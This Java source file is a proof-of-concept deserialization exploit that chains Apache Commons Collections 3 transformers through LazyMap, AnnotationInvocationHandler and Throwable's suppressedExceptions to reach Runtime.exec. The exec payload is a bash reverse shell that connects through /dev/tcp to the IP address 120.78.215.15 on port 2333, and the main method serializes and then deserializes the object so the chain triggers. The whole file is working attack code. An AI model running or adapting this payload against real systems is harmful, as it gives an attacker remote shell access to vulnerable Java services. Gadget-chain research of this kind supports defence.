package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class POC_3 {

    /***
     * <java.lang.Throwable: void readObject(java.io.ObjectInputStream)>
     * <sun.reflect.annotation.AnnotationInvocationHandler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
     * <java.lang.Runtime: void exec(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"bash -c $@|bash 0 echo bash -i >& /dev/tcp/120.78.215.15/2333 0>&1"}),
        };
        Transformer transformChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformChain);

        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, outerMap});

        List proxyList = (List) Proxy.newProxyInstance(List.class.getClassLoader(),new Class[]{List.class}, handler);
        Throwable t = new Throwable();
        ReflectionUtil.setField(t, "suppressedExceptions", proxyList);
        ReflectionUtil.setField(transformChain, "iTransformers", transformers);

        SerializeUtil.deserialize(SerializeUtil.serialize(t));
    }

}
